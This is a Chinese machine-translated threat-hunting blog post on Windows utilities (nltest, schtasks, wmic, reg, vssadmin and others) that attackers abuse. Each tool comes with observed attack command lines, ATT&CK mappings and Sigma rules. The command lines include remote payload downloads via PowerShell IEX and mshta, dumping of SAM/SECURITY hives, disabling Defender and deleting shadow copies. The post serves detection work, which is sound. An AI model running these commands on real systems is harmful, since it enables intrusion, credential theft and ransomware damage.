# 威胁参与者和恶意软件使用的常用工具和技术—第一部分

> 原文：<https://infosecwriteups.com/common-tools-techniques-used-by-threat-actors-and-malware-part-i-deb05b664879?source=collection_archive---------0----------------------->

![](img/3392f18aa10dfa5b44bed514dd7da962.png)

照片由 [timJ](https://unsplash.com/@the_roaming_platypus?utm_source=medium&utm_medium=referral) 在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄

如果你一直关注信息安全领域，哪怕只关注一点点，你肯定听说过最近发生在太阳风猎户座产品中的供应链攻击。这是一次真正复杂的攻击，展示了一个有决心、有耐心、有技能的团队所能做的事情。

人们对“旭日”后门使用的技术和策略进行了大量的研究，并发表了大量的博客文章对其进行了极其详细的描述。

但是 CrowdStrike 最近发表的一篇名为**“黑子:构建过程中的植入物”**的博客文章详细描述了威胁参与者如何能够将“阳光爆发”后门注入网络安全管理软件产品猎户座 IT 管理产品的源代码。

[](https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/) [## 黑子恶意软件:技术分析

### 2020 年 12 月，针对网络安全管理软件产品公司的复杂供应链攻击的披露震惊了整个行业

www.crowdstrike.com](https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/) 

虽然博客本身是一个引人入胜的读物，你一定要看看。让我“惊讶”的一件事是两种技术的使用。

第一个是使用**计划任务实用程序**的持久性，第二个是以典型的恶意软件方式放入磁盘 **(C:\Windows\Temp\)** 的日志文件。

这让我想到，如果即使是最老练的攻击者仍然使用这样的技术和工具。然后，总有希望抓到他们。

所以在这篇博文中，我想我会写一些最近几年恶意软件和威胁者使用的最常见的技术、实用工具和命令行参数。

为此，我回过头来阅读了大约 60 篇最近的博文和评论，分别来自于***[*火眼*](https://www.fireeye.com/blog.html)*[*the dfirreport*](https://thedfirreport.com/)*】、*[*crowd strike*](https://www.crowdstrike.com/)*、*[*red canary*](https://redcanary.com/blog/)*、*并搜索最近上传到网站的恶意软件，如*"*[*any . run*](https://any.run/)*"，*[*hybrid-analysis*](https://www.hybrid-analysis.com/)*"，* [*研讯*](https://labs.inquest.net/)*和*[*tria . ge*](http://tria.ge/)********

******注意:这两部分系列的第一部分将主要关注工具和它们的命令行参数。诸如进程注入、进程中空化、命名管道等技术。将在第二部分讨论。******

# ***Windows 实用程序(LoLBins)***

***这绝对不会让任何人感到震惊。windows 实用程序是恶意软件和威胁参与者使用最广泛的工具之一。从发现和横向移动到坚持。以下是近年来最常见的，排名不分先后。***

# ***nltest(nltest.exe)***

> ***网络位置测试—列出域控制器(DC)，强制远程关机，查询信任状态，测试信任关系和域控制器复制的状态。— [**ss64**](https://ss64.com/nt/nltest.html)***

***如上所述，威胁参与者经常使用该工具通过**“domain _ trust”**和**“DC list”**枚举活动目录信任和域控制器***

***最常见的论点如下:***

*   ***/DOMAIN_TRUSTS —在<servername>上查询域信任</servername>***
*   ***/DCLIST: <domainname>—获取<domainname>的 DC 列表</domainname></domainname>***

```
***nltest /domain_trusts
nltest /domain_trusts /all_trusts
nltest /dclist:"[DOMAIN]"***
```

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与此工具相关***

*   ***[T1482 —域信任发现](https://attack.mitre.org/techniques/T1482)***
*   ***[T1018 —远程系统发现](https://attack.mitre.org/techniques/T1018)***
*   ***[T1016 —系统网络配置发现](https://attack.mitre.org/techniques/T1016)***

## *****西格玛规则*****

***您可以使用以下 sigma 规则来检测该工具:***

*   ***win_trust_discovery.yml***

# ***施塔克斯(schtasks.exe)***

> ***使管理员能够在本地或远程计算机上创建、删除、查询、更改、运行和结束计划任务— [MSDN](https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks)***

***被恶意软件和威胁参与者用作在系统上持续存在的手段。以下是最常见的论点及其含义。***

*   *****/创建:**创建一个调度任务。***
*   *****/tn(任务名称):**指定唯一标识计划任务的名称的值。***
*   *****/sc (schedule) :** 指定调度频率的值。有效值包括:分钟、每小时、每天、每周、每月、一次、登录、ONIDLE 和 ONEVENT。***
*   *****/mo(修改量):**细化计划类型的值，以便更好地控制计划重复。有效值包括:***
*   *****/tr (taskrun) :** 一个值，指定要在计划时间运行的任务的路径和文件名。***
*   *****/ru (runasuser) :** 指定任务运行的用户上下文的值。***
*   *****/run :** 用于立即运行已调度的任务。***
*   *****/f (force) :** 强制创建任务的值，如果指定的任务已经存在，则取消警告。***
*   *****/rl (level) :** 设置任务运行级别的值。有效值是有限的和最高的。默认值是有限的。***
*   *****/st (starttime) :** 指定运行任务的开始时间的值。时间格式为 HH:mm (24 小时制)。***
*   *****/XML (xmlfile) :** 从 XML 文件创建任务的值***
*   *****/删除:**删除一个调度任务***
*   *****/S :** 指定要连接的远程计算机的值。如果省略，系统参数默认为本地计算机。***
*   *****/end:** 停止正在运行的计划任务。***

***以下是恶意软件/威胁行为者如何执行该实用程序几个示例。***

```
*SCHTASKS /create /tn [TASK NAME] /sc HOURLY /mo 1 /tr "cmd /c sc config [Service Name] start=AUTO&net start [Service Name]"  /ru "NT AUTHORITY\SYSTEM" & SCHTASKS /run /tn [TASK NAME]schtasks /create /tn [TASK NAME] /tr "C:\Windows\system32\mshta.exe C:\ProgramData\malicious.hta" /sc onlogon /ru System /fschtasks.exe /Create /SC MINUTE /TN [TASK NAME] /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\redacted.ps1" /MO 30 /Fschtasks /CREATE /SC ONSTART /TN [TASK NAME] /TR "'C:\Users\redacted.exe'" /fschtasks /CREATE /SC ONCE /ST 17:21:58 /TN [TASK NAME] /TR "'C:\Users\redacted.exe'" /f /RL HIGHESTschtasks.exe /CREATE /XML C:\Windows\TEMP\redacted.xml /TN [TASK NAME] /FSCHTASKS /Delete /TN * /Fschtasks /tn [TASK NAME] /endschtasks /create /tn [TASK NAME] /tr "c:\windows\temp\redacted.bat" /sc ONCE /st 00:00 /F /RU System /S [Remote Host]*
```

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与该工具相关***

*   ***[T1053.005 —预定任务/作业:预定任务](https://attack.mitre.org/techniques/T1053/005/)***

## ***西格玛规则***

***您可以使用以下 sigma 规则来检测该工具:***

*   ***win_susp_schtask_creation.yml***
*   ***win_rare_schtask_creation.yml***
*   ***win _ powersploit _ empire _ schtasks . yml***

# ***wmic(wmic.exe)***

> ***WMI 命令行(WMIC)实用程序为 Windows Management Instrumentation(WMI)——[MSDN](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)提供了命令行界面***

***攻击者以许多不同的方式使用这个工具。您可以终止进程、搜索进程、删除卷影副本、本地或远程执行进程等等(实际上是无限)。这里有几个关于如何使用这个工具例子***

```
*wmic /node:"Remote @IP" process call create "Malicious File"wmic process where "name like '%$process%'" deletewmic.exe shadowcopy deletewmic process where ExecutablePath='Path to executable' deletewmic /NODE:"COMPUTER NAME" /USER:"username" /PASSWORD:"password" process call create "powershell.exe -Command {IEX (New-Object   Net.Webclient).DownloadString('http://@IP/redacted.ps1')}"wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"*
```

***请注意，WMI 经常被威胁者和恶意软件使用。《WMIC》只是故事的一半。你可以用 WMI 和 powershell 做神奇的事情。***

***我强烈建议你阅读更多关于这个和最近利用 WMI 的攻击。***

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与此工具相关***

*   ***[T1518.001 —软件发现:安全软件发现](https://attack.mitre.org/techniques/T1518/001/)***
*   ***[T1490 —抑制系统恢复](https://attack.mitre.org/techniques/T1490/)***
*   ***[T1047 — Windows 管理规范](https://attack.mitre.org/techniques/T1047/)***
*   ***[T1220 — XSL 脚本处理](https://attack.mitre.org/techniques/T1220/)***
*   ***[T1078.003 —有效账户:本地账户](https://attack.mitre.org/techniques/T1078/003/)***
*   ***[T1057 —进程发现](https://attack.mitre.org/techniques/T1057/)***

## ***西格玛规则***

***根据执行的上下文，您可以使用多个 sigma 规则来检测“wmic”的用法，下面是几个示例:***

*   ***win_susp_wmi_execution.yml***
*   ***win_xsl_script_processing.yml***
*   ***win_susp_eventlog_clear.yml***

# ***网络(net.exe)***

> ***Net.exe 实用程序组件是一个命令行工具，用于控制用户、组、服务和网络连接。— [MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa939914(v=winembedded.5)?redirectedfrom=MSDN)***

***该实用程序可用于查看共享、创建用户和组、发现、查看密码策略等。以下是威胁参与者和恶意软件执行的一些命令:***

```
*net usernet group "domain admins" /domainnet group "enterprise admins" /domainnet group "Domain Users" /domainnet viewnet view /all /domainnet /stop [Service] /ynet sharenet usersnet usenet use q: \\DomainController\DomainName /user:DomainName\administrator [Password]net config workstationnet localgroup usersnet localgroup /domain*
```

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与该工具相关***

*   ***[T1087.001 帐户发现:本地帐户](https://attack.mitre.org/techniques/T1087/001)***
*   ***[T1087.002 帐户发现:域帐户](https://attack.mitre.org/techniques/T1087/002)***
*   ***[T1136.001 创建账户:本地账户](https://attack.mitre.org/techniques/T1136/001)***
*   ***[T1136.002 创建账户:域账户](https://attack.mitre.org/techniques/T1136/002)***
*   ***[T1070.005 主机上的指示器移除:网络共享连接移除](https://attack.mitre.org/techniques/T1070/005)***
*   ***[T1135 网络共享发现](https://attack.mitre.org/techniques/T1135)***
*   ***[T1201 密码策略发现](https://attack.mitre.org/techniques/T1201)***
*   ***[T1069.001 权限组发现:本地组](https://attack.mitre.org/techniques/T1069/001)***
*   ***[T1069.002 权限组发现:域组](https://attack.mitre.org/techniques/T1069/002)***
*   ***[T1021.002 远程服务:中小企业/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002)***
*   ***[T1018 远程系统发现](https://attack.mitre.org/techniques/T1018)***
*   ***[T1049 系统网络连接发现](https://attack.mitre.org/techniques/T1049)***
*   ***[T1007 系统服务发现](https://attack.mitre.org/techniques/T1007)***
*   ***[T1569.002 系统服务:服务执行](https://attack.mitre.org/techniques/T1569/002)***
*   ***[T1124 系统时间发现](https://attack.mitre.org/techniques/T1124)***

# ***sc(sc.exe)***

> ***与服务控制器和已安装的服务进行通信— [MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11))***

***被攻击者用来禁用、创建、删除或停止服务。以下是最常见的论点。***

*   *****创建:**在注册表和服务控制管理器数据库中为服务创建子项和条目。***
*   *****Config :** 修改注册表和服务控制管理器数据库中服务条目的值。***
*   *****删除:**从注册表中删除一个服务子项。如果服务正在运行，或者如果另一个进程打开了该服务的句柄，则该服务将被标记为删除***
*   *****停止:**向服务发送停止控制请求。***

```
*sc config [Service] start= Disabledsc config [Service] binPath= "Malicious Command"sc delete [Service]sc start [Service] sc stop [Service]sc create [Redacted] binPath="Path" DisplayName= "Redacted" start= auto*
```

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与该工具相关***

*   ***[T1543.003 —创建或修改系统进程:Windows 服务](https://attack.mitre.org/techniques/T1543/003/)***
*   ***[T1569.002 —系统服务:服务执行](https://attack.mitre.org/techniques/T1569/002/)***

## ***西格玛规则***

***您可以使用以下 sigma 规则来检测该工具:***

*   ***win _ using _ sc _ to _ change _ service _ image _ path _ by _ non _ admin . yml***
*   ***win _ susp _ service _ path _ modification . yml***
*   ***win_service_stop.yml***
*   ***win_new_service_creation.yml***
*   ***win _ multiple _ suspective _ CLI . yml***

# ***BCDEdit(bcdedit.exe)***

> ***BCDEdit 是一个命令行工具，用于管理引导配置数据存储— [MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731662(v=ws.11))***

***通常被勒索软件用来禁用恢复功能。***

```
*bcdedit /set {default} recoveryenabled Nobcdedit /set {default} bootstatuspolicy ignoreallfailuresbcdedit /set {current} safeboot minimalbcdedit  /f /delete {bootmgr}bcdedit /set {globalsettings} advancedoptions falsebcdedit.exe  /import "C:\Users\redacted\redacted.txt" /clean*
```

## ***相关的斜接技术***

***来自 CK 的**米特 ATT &的以下技术与该工具相关*****

*   ***[T1490 —禁止系统恢复](https://attack.mitre.org/techniques/T1490/)***

## ***西格玛规则***

***您可以使用以下 sigma 规则来检测该工具:***

*   ***[win_susp_bcdedit.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bcdedit.yml)***

# ***姆什塔(mshta.exe)***

> ***Mshta.exe 是一个执行微软 HTML 应用程序(HTA)文件的工具— [维基百科](https://en.wikipedia.org/wiki/HTML_Application)***

***通常出现在感染的早期阶段，如 office 可执行文件或 WINRAR 等。但是可以被视为绕过白名单或应用控制机制。***

```
*mshta.exe [URL] /fmshta.exe ""about:<hta:application><script>[Malicious Content]</script>"mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();*
```

## ***相关的斜接技术***

***以下来自**米特 ATT & CK** 的技术与该工具相关***

*   ***[T1218.005 —签名的二进制代理执行:Mshta](https://attack.mitre.org/techniques/T1218/005/)***

## ***西格玛规则***

***您可以使用以下 sigma 规则来检测该工具:***

*   ***[win _ mshta _ JavaScript . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml)***
*   ***[win _ mshta _ spawn _ shell . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml)***

# ***rundll 32(rundll32.exe)***

***顾名思义，“rundll32.exe”可执行文件用于“运行 dll”或动态链接库。我以前在博客上写过，所以去看看吧，以便更好地理解这个工具是如何工作的。***

***[](https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90) [## 深入了解 RUNDLL32。可执行程序的扩展名

### 了解“rundll32.exe”命令行参数

nasbench.medium.com](https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90) 

简而言之，这个工具可以用来执行恶意的动态链接库，劫持 COM 服务器，JavaScript，甚至远程执行共享的动态链接库。LOLBAS 项目有一些很好的例子。

 [## rundll32 | LOLBAS

### https://evi1cg . me/archives/app locker _ Bypass _ techniques . html # menu _ index _ 7

lolbas-project.github.io](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) 

在野外，你会经常看到 DLL 的执行，其中有问题的 DLL 是一个钴打击有效载荷。事情是这样的:

```
rundll32 [Malicious DLL], [Exported Function]rundll32 [Malicious DLL], #[Exported Function by Ordinal]
```

## 相关的斜接技术

以下来自**米特 ATT & CK** 的技术与该工具相关

*   [T1218.011 —签名的二进制代理执行:Rundll32](https://attack.mitre.org/techniques/T1218/011/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ process _ dump _ rundll32 _ com SVCs . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_process_dump_rundll32_comsvcs.yml)
*   [win _ susp _ rundll32 _ activity . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_activity.yml)
*   [win _ susp _ rundll32 _ by _ ordinal . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_by_ordinal.yml)
*   [win _ susp _ wmic _ proc _ create _ rundll 32 . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmic_proc_create_rundll32.yml)

# 属性(attrib.exe)

> 显示、设置或删除分配给文件或目录的属性— [MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib)

通常被恶意软件用来隐藏文件或文件夹。

```
attrib +h [File / Folder]attrib +s +h [File / Folder]
```

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ attrib _ hiding _ files . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml)

# reg(reg.exe)

> Reg 是一个用于与 Windows 注册表交互的 Windows 实用程序。可以在命令行界面使用它来查询、添加、修改和删除信息。— [米特 ATT & CK](https://attack.mitre.org/software/S0075/)

被攻击者用作通过添加或修改密钥在系统上持续存在的手段，用作检查是否安装了某些配置或软件的查询机制，以及用作转储凭据的机制。

以下是攻击者使用该实用程序的最常见参数:

*   **ADD :** 向注册表中添加一个新的子项或条目。
*   **保存:**在指定的文件中保存指定的注册表子项、条目和值的副本。
*   **QUERY :** 返回位于注册表中指定子项下的下一层子项和条目的列表。
*   **删除:**从注册表中删除子项或条目。

由于该实用程序的用法很简单(您可以在 MSDN 中查找)，从命令行的角度来看，有趣的是攻击者或恶意软件试图修改、转储或写入的注册表项。为此，我会简单地说谷歌一下，你会找到一篇关于它的文章。下面是一些最常见的。

```
reg.exe save hklm\security [PATH]reg save hklm\system [PATH]reg save hklm\sam [PATH]reg ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "[NAME]" /t REG_SZ /F /D "[COMMAND]"reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /freg  add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "3" /freg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\Data [Path] /yreg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\GBG [Path] /yreg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\Skew1 [Path] /yreg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\JD [Path] /y
```

这个列表本身可以是一篇博客文章。我鼓励你看看我将在这篇博客末尾链接的参考资料，看看更多的注册表项在起作用。

## 相关的斜接技术

来自 CK**米特 ATT &的以下技术与该工具相关**

*   [T1112 —修改注册表](https://attack.mitre.org/techniques/T1112/)
*   [T1012 —查询注册表](https://attack.mitre.org/techniques/T1012/)
*   [T1552.002 —不安全的凭据:注册表中的凭据](https://attack.mitre.org/techniques/T1552/002/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ multiple _ suspective _ CLI . yml](https://github.com/Neo23x0/sigma/blob/c56cd2dfff6343f3694ef4fd606a305415599737/rules/windows/process_creation/win_multiple_suspicious_cli.yml)

# 沃阿米语(whoami.exe)

> 显示当前登录到本地系统的用户的用户、组和权限信息— [MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)

以下是恶意软件或威胁参与者最常用的标志/参数:

*   **/upn :** 以用户主要名称(upn)格式显示用户名。
*   **/用户:**显示当前域和用户名以及安全标识符(SID)。
*   **/groups :** 显示当前用户所属的用户组。
*   **/priv :** 显示当前用户的安全权限。
*   **/all :** 显示当前接入令牌中的所有信息，包括当前用户名、安全标识符(SID)、权限以及当前用户所属的组。

```
whoami
whoami /all
whoami /groups
whoami /priv
whoami /user
whoami /upn
```

## 相关的斜接技术

以下来自**米特 ATT & CK** 的技术与该工具相关

*   [T1033 —系统所有者/用户发现](https://attack.mitre.org/techniques/T1033/)
*   [T1059.003 —命令和脚本解释器:Windows 命令外壳](https://attack.mitre.org/techniques/T1059/003/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ susp _ commands _ recon _ activity . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml)

# 系统信息(systeminfo.exe)

> 显示计算机及其操作系统的详细配置信息，包括操作系统配置、安全信息、产品 ID 和硬件属性(如 RAM、磁盘空间和网卡)——[MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo)

被恶意软件和威胁参与者用作发现手段。日志中最常见的形式就是“systeminfo.exe”。但是也可以使用“/s”标志远程执行。

```
systeminfo.exe
systeminfo /s [Remote Computer]
```

## 相关的斜接技术

以下来自**米特 ATT & CK** 的技术与该工具相关

*   [T1082 —系统信息发现](https://attack.mitre.org/techniques/T1082/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ susp _ commands _ recon _ activity . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml)

# ARP(arp.exe)和平(ping.exe)

> ARP:显示和修改地址解析协议(ARP)缓存中的条目— MSDN

ARP 命令最常用“-a”参数来显示系统上的 ARP 表。

> PING:通过发送 Internet 控制消息协议(ICMP)回应请求消息来验证与另一台 TCP/IP 计算机的 IP 级连接——MSDN

ping 命令通常用作发现机制来查看机器是否启动，或者用作执行命令之前的延迟机制。

以下是恶意软件或威胁行为者执行这两种实用程序的示例:

```
arp -a
ping -n [Number Of Pings] -4 @IP
ping localhost -n 5 && del [Path to executable]
ping [DOMAIN CONTROLLER]
ping  @IP -n 1 -w 5000
ping 0x7f000001 -n 5 -w 10000
```

## 相关的斜接技术

以下来自**米特 ATT & CK** 的技术与此工具相关

*   [T1016 —系统网络配置发现](https://attack.mitre.org/techniques/T1016/)
*   [T1018 —远程系统发现](https://attack.mitre.org/techniques/T1018/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [sysmon _ susp _ ping _ hex _ IP . yml](https://web.archive.org/web/20180324153155/https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_susp_ping_hex_ip.yml)

# taskkill(taskkill.exe)

> 结束一个或多个任务或进程。进程可以通过进程 ID 或映像名称结束— [MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/taskkill)

顾名思义，这个实用程序用于终止正在运行的进程。通常被恶意软件或威胁者用来确保备份软件或反病毒软件等其他进程不会干扰他们的工作。

两个最常见的命令行参数是:

*   **/im :** 指定要终止的进程的图像名。使用通配符(`*`)指定所有图像名称。
*   **/f :** 指定强制结束进程。对于远程进程，此参数被忽略；所有远程进程都被强制结束。

因此，恶意软件经常执行的命令行如下:

```
taskkill /im [Executable] /f
```

## 相关的斜接技术

来自 CK 的**米特 ATT &的以下技术与该工具相关**

*   [T1562.001 —削弱防御:禁用或修改工具](https://attack.mitre.org/techniques/T1562/001/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ multiple _ suspective _ CLI . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml)
*   [killmultipleprocess . yml](https://github.com/joesecurity/sigma-rules/blob/master/rules/killmultipleprocess.yml)

# 国际会计师联合会(icacls.exe)

> 显示或修改指定文件的自由访问控制列表(dacl ),并将存储的 dacl 应用于指定目录中的文件。——[MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

通常被恶意软件和勒索软件用来更改和修改目录和文件权限。

要么在勒索软件的情况下授予对文件和文件夹的完全权限，这通常是启动加密操作之前的最后步骤之一。或者通过删除对文件夹或文件的所有访问来创建持久性。

以下是最常见的参数及其含义:

*   **/T :** 遍历所有子文件夹，匹配文件/目录。
*   **/C :** 继续上档错误。
*   **/L :** 对符号链接本身执行操作，而不是它的目标。
*   **/Q :** 安静抑制成功消息。
*   **/授予用户:权限:**授予访问权限
*   **/deny user:permission :** 明确拒绝指定用户的访问权限。
*   **":F "(完全访问)/" R "(只读)**

以下是恶意软件如何利用这一点的几个例子:

```
icacls [Disk Partition]:\* /grant Everyone:F /T /C /Qicacls [Path To File/Folder] /deny *S-1-1-0:Ricacls [Path to Folder/File] /inheritance:e /deny "SYSTEM:(R,REA,RA,RD)"icacls [Path To File/Folder] /deny *S-1-1-0:(OI)(CI)(DE,DC)
```

## 相关的斜接技术

来自 CK 的**米特 ATT &的以下技术与该工具相关**

*   [T1222.001 —文件和目录权限修改:Windows 文件和目录权限修改](https://attack.mitre.org/techniques/T1222/001/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ multiple _ suspective _ CLI . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml)
*   [win _ file _ permission _ modifies . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_file_permission_modifications.yml)

# vssadmin(vssadmin.exe)

> 显示当前卷影副本备份和所有已安装的卷影副本编写器和提供程序— [MSDN](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin)

勒索软件经常使用该工具从计算机中删除磁盘卷影副本，以防止任何恢复。最常见的命令行参数如下:

```
vssadmin delete shadowsvssadmin delete shadows /allvssadmin delete shadows /all /quietvssadmin resize shadowstorage
```

## 相关的斜接技术

以下来自**米特 ATT & CK** 的技术与该工具相关

*   [T1490 —抑制系统恢复](https://attack.mitre.org/techniques/T1490/)

## 西格玛规则

您可以使用以下 sigma 规则来检测该工具:

*   [win _ shadow _ copies _ deletion . yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml)*** 

# ***开源/第三方工具***

***除了 windows 二进制文件，攻击者还使用一些开源/第三方工具来执行他们的攻击。以下是攻击者使用的一些工具***

*   ***[AdFind](https://www.joeware.net/freetools/tools/adfind/)***
*   ***[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)***
*   ***[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)***
*   ***[警犬](https://github.com/BloodHoundAD/BloodHound)***
*   ***[LaZagne](https://github.com/AlessandroZ/LaZagne)***
*   ***[后卫控制](https://www.sordum.org/9480/defender-control-v1-6/)***
*   ***[高级 IP 扫描仪](https://www.advanced-ip-scanner.com/)***
*   ***[NirSoft 密码恢复工具](https://www.nirsoft.net/password_recovery_tools.html)***
*   ***[PowerShell 帝国](https://www.powershellempire.com/)***
*   ***[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)***
*   ***米米卡兹***
*   ***[钴击](https://www.cobaltstrike.com/)***
*   ***[撞击](https://github.com/SecureAuthCorp/impacket)***

*****注意:**这绝不是一个详尽的列表，这些是我在阅读这些博客帖子和查看沙盒报告时发现的最常见的工具。***

***你会注意到我省略了 PowerShell、WScript、Regsvr32、Dllhost…等实用程序。这些仍然非常普遍，并在攻击中使用。我希望你这位读者能有足够的兴趣去查阅我下面链接的一些资源，做更多的研究。***

# ***探测/威胁搜寻机会***

***既然我们已经熟悉了恶意软件和威胁参与者使用的一些实用程序，那么您将会想要开始编写规则或使用开源规则来检测它们。无论你是设计一个检测还是寻找一个威胁，这些都是你应该寻找并牢记在心的。***

## ***为您的环境设定基准***

***在开始编写规则和触发警报之前，您需要记住，现有的大多数规则并不是针对特定环境而设计的，而是针对特定威胁或技术而设计的。这意味着当你写或实现一个规则时，不要只看表面价值。始终通过为环境中的用户行为设定基线来使其适应您的环境。我们都有一个拥有“最伟大”想法的管理者。***

## ***注册表项修改/创建***

***出于多种原因，大多数恶意软件和威胁参与者(如果不是全部的话)都会以某种形式与注册表进行交互。***

***一个好主意是通过创建规则来监视具有不同威胁分值的特定注册表项，从而始终关注注册表项的交互。***

***即使您负担不起对不同注册表项进行研究的费用。互联网上充斥着描述当前恶意软件和威胁行为者正在使用的博客帖子和研究。***

## ***连续执行***

***本博客中提到的大多数工具都是管理员和脚本在某些环境中日常使用的。如果你写了一个规则，每次被使用时触发，你会陷入一个错误的夜晚。***

***对于这样的实用程序，总是要考虑执行之间的时间间隔。以下面的例子为例:***

```
*whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group “domain admins” /domain 2>&1 & net group “Exchange Trusted Subsystem” /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” 2>&1*
```

***正在运行***【whoami】******【主机名】******【ipconfig/all】******【网络用户/域】***……等等。连续的可能性很小。***

## ***命令行参数***

***这篇博文的全部目的是让非初学者(包括我自己)熟悉近年来恶意软件使用的工具和命令行参数。所以如果你从这里拿走任何东西***

> *****始终调查进程的命令行*****

## ***不寻常的子女/父母关系***

***威胁参与者或恶意软件在执行之前需要做的第一件事是到达其目标，为此需要一个入口点。***

***不管是电子邮件附件还是其他什么。恶意软件需要欺骗用户(除了不需要用户交互的漏洞之外)来执行某些操作。***

***因此，在某个时间点，我们会有一个**“合法”**进程，如**“word . exe”**，产生另一个进程，该进程将执行恶意代码，如**“powershell . exe”。****“合法”**子进程的概念需要一些你要对付的操作系统的知识，以及捕捉邪恶所需的知识。***

# ***结论***

***在第一部分中，我们已经了解了近年来恶意软件使用的一些最常见的 windows 实用程序和开源工具。我们还介绍了一些探测和狩猎的想法。***

***感谢阅读。如果你对此有任何问题或补充，请在 twitter 上打我 [**@nas_bench**](https://twitter.com/nas_bench)***

***[](https://www.buymeacoffee.com/nasbench) [## Nasreddine Bencherchali 正在创建关于威胁追踪和检测工程的 Infosec 博客

### 热心的学习者。对所有事情都充满热情#恶意软件# DFIR # Python #威胁狩猎并热爱#WindowsInternals

www.buymeacoffee.com](https://www.buymeacoffee.com/nasbench) 

# 资源

*   [https://thedfirreport.com/](https://thedfirreport.com/)
*   https://redcanary.com/blog/
*   【https://attack.mitre.org/ 
*   [https://www.fireeye.com/blog.html](https://www.fireeye.com/blog.html)
*   [https://research.checkpoint.com/](https://research.checkpoint.com/)
*   [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
*   [https://docs.microsoft.com/en-us/](https://docs.microsoft.com/en-us/)
*   [https://any.run/](https://any.run/)
*   [http://tria.ge/](http://tria.ge/)
*   [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)
*   [https://cyberpolygon.com/materials/](https://cyberpolygon.com/materials/)
*   [https://www.crowdstrike.com/blog/](https://www.crowdstrike.com/blog/)
*   [https://labs.inquest.net/](https://labs.inquest.net/)
*   [https://symantec-enterprise-blogs.security.com/blogs/](https://symantec-enterprise-blogs.security.com/blogs/)
